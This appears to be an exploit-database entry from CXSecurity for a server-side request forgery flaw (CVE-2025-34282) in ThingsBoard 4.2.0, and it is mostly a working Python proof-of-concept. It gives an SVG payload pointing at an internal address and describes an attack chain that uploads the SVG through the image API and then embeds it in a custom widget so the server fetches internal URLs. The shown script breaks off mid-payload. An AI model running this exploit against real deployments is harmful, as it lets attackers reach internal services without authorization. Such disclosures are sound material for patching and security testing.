---
title: ThingsBoard IoT Platform 4.2.0 Server-Side Request Forgery (SSRF)
url: https://cxsecurity.com/issue/WLB-2026050018
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2026-05-23
fetch_date: 2026-05-24T06:00:43.882780
---

# ThingsBoard IoT Platform 4.2.0 Server-Side Request Forgery (SSRF)

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **ThingsBoard IoT Platform 4.2.0 Server-Side Request Forgery (SSRF)** **2026.05.23**  Credit:  **[Tamil Mathi T.](https://cxsecurity.com/author/Tamil%2BMathi%2BT./1/)**  Risk: **Low**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2025-34282](https://cxsecurity.com/cveshow/CVE-2025-34282/ "Click to see CVE-2025-34282")**  CWE: **N/A** | |

# Exploit Title: ThingsBoard IoT Platform 4.2.0 - Server-Side Request Forgery (SSRF)
# Date: 2026-03-25
# Exploit Author: Tamil Mathi T.
# Vendor Homepage: https://thingsboard.io
# Software Link: https://github.com/thingsboard/thingsboard
# Version: < 4.2.1
# Tested On: ThingsBoard 4.2.0
# CVE: CVE-2025-34282
# References: https://www.cve.org/CVERecord?id=CVE-2025-34282
# https://github.com/mathitam/thingsboard-ssrf-cve-2025-34282
#
# Description:
# ThingsBoard versions before 4.2.1 are vulnerable to SSRF via the Image
# Upload Gallery feature. An attacker can upload a crafted SVG file containing
# a remote URL reference (e.g. via <image xlink:href="http://127.0.0.1:5555">).
# When ThingsBoard processes the uploaded SVG server-side, it fetches the
# referenced URL, allowing the attacker to reach internal services not
# exposed to the internet.
#
# Requires a Tenant Admin bearer token. Tenant Admin is a role below System
# Admin in ThingsBoard's hierarchy and has access to the Widget Library and
# Image Upload Gallery APIs used in this exploit.
#
# Attack chain:
# 1. Upload a malicious SVG to POST /api/image
# -> Server processes the SVG and issues a request to the internal URL
# 2. Create a custom widget embedding the SVG's publicLink via <object> tag
# -> Widget render also triggers the server-side fetch
#
# SVG payload used (ssrf\_localhost\_5555\_svg.svg):
# <?xml version="1.0" standalone="no"?>
# <svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg"
# xmlns:xlink="http://www.w3.org/1999/xlink"
# xmlns:ev="http://www.w3.org/2001/xml-events">
# <defs>
# <pattern id="img1" patternUnits="userSpaceOnUse" width="600" height="450">
# <image xlink:href="http://127.0.0.1:5555" x="0" y="0" width="600" height="450" />
# </pattern>
# </defs>
# <path d="M5,50 l0,100 l100,0 l0,-100 l-100,0 ..." fill="url(#img1)" />
# </svg>
#
# Usage:
# pip install requests
# python thingsboard\_ssrf.py <svg\_file> <bearer\_token>
#
# Example:
# python thingsboard\_ssrf.py ssrf\_localhost\_5555\_svg.svg eyJhbGci...
import requests
import json
import os
import sys
import argparse
import time
DEFAULT\_URL\_UPLOAD = "http://localhost:8080/api/image"
DEFAULT\_URL\_WIDGET = "http://localhost:8080/api/widgetType"
DEFAULT\_REFERER = "http://localhost:8080/resources/images"
DEFAULT\_ORIGIN = "http://localhost:8080"
def upload\_image(filepath, token):
if not os.path.isfile(filepath):
raise SystemExit(f"File not found: {filepath}")
filename = os.path.basename(filepath)
mime\_types = {
'.svg': 'image/svg+xml',
'.jpg': 'image/jpeg',
'.jpeg': 'image/jpeg',
'.png': 'image/png',
'.gif': 'image/gif'
}
ext = os.path.splitext(filename)[1].lower()
mime\_type = mime\_types.get(ext, 'application/octet-stream')
headers = {
"X-Authorization": f"Bearer {token}",
"User-Agent": "python-requests/2.x",
"Referer": DEFAULT\_REFERER,
"Origin": DEFAULT\_ORIGIN,
}
with open(filepath, "rb") as f:
files = {
"file": (filename, f, mime\_type)
}
resp = requests.post(DEFAULT\_URL\_UPLOAD, headers=headers, files=files, timeout=30, allow\_redirects=False)
return resp
def create\_widget(public\_link, token):
headers = {
"X-Authorization": f"Bearer {token}",
"Content-Type": "application/json",
"Accept": "application/json, text/plain, \*/\*",
"Origin": DEFAULT\_ORIGIN,
"User-Agent": "python-requests"
}
template\_html = f"""
<tb-value-card-widget
[ctx]="ctx"
[widgetTitlePanel]="widgetTitlePanel">
</tb-value-card-widget>
<object data="{public\_link}" type="image/svg+xml"></object>
"""
payload = {
"fqn": "SSRF\_testing\_Poc",
"name": "SSRF\_testing\_Poc",
"deprecated": False,
"image": "tb-image;/api/images/system/air\_quality\_index\_card\_system\_widget\_image.png",
"description": "Displays the latest air quality index telemetry in a scalable rectangle card.",
"descriptor": {
"type": "latest",
"sizeX": 3,
"sizeY": 3,
"resources": [],
"templateHtml": template\_html,
"templateCss": "",
"controllerScript": "self.onInit = function() {\n self.ctx.$scope.valueCardWidget.onInit();\n};\n\nself.onDataUpdated = function() {\n self.ctx.$scope.valueCardWidget.onDataUpdated();\n};\n\nself.typeParameters = function() {\n return {\n maxDatasources: 1,\n maxDataKeys: 1,\n singleEntity: true,\n previewWidth: '250px',\n previewHeight: '250px',\n embedTitlePanel: true,\n supportsUnitConversion: true,\n defaultDataKeysFunction: function() {\n return [{ name: 'air', label: 'Air Quality Index', type: 'timeseries' }];\n }\n };\n};\n\nself.onDestroy = function() {\n};\n",
"dataKeySettingsForm": [],
"settingsDirective": "tb-value-card-widget-settings",
"hasBasicMode": True,
"basicModeDirective": "tb-value-card-basic-config",
"defaultConfig": "{\"datasources\":[{\"type\":\"function\",\"name\":\"function\",\"dataKeys\":[{\"name\":\"f(x)\",\"type\":\"function\",\"label\":\"Air Quality Index\",\"color\":\"#2196f3\",\"settings\":{},\"\_hash\":0.2392660816082064,\"funcBody\":\"var value = prevValue + Math.random() \* 100 - 50;\\nif (value < 0) {\\n\\tvalue = 0;\\n} else if (value > 320) {\\n\\tvalue = 320;\\n}\\nreturn value;\",\"aggregationType\":null,\"units\":null,\"decimals\":null,\"usePostProcessing\":null,\"postFuncBody\":null}],\"alarmFilterConfig\":{\"statusList\":[\"ACTIVE\"]}}],\"timewindow\":{\"realtime\":{\"timewindowMs\":60000}},\"showTitle\":false,\"backgroundColor\":\"rgba(0, 0, 0, 0)\",\"color\":\"rgba(0, 0, 0, 0.87)\",\"padding\":\"0px\",\"settings\":{\"labelPosition\":\"top\",\"layout\":\"square\",\"showLabel\":true,\"labelFont\":{\"size\":14,\"sizeUnit\":\"px\",\"family\":\"Roboto\",\"weight\":\"500\",\"style\":\"normal\"},\"labelColor\":{\"type\":\"constant\",\"color\":\"rgba(0, 0, 0, 0.87)\",\"colorFunction\":\"var temperature = value;\\nif (typeof temperature !== undefined) {\\n var percent = (temperature +...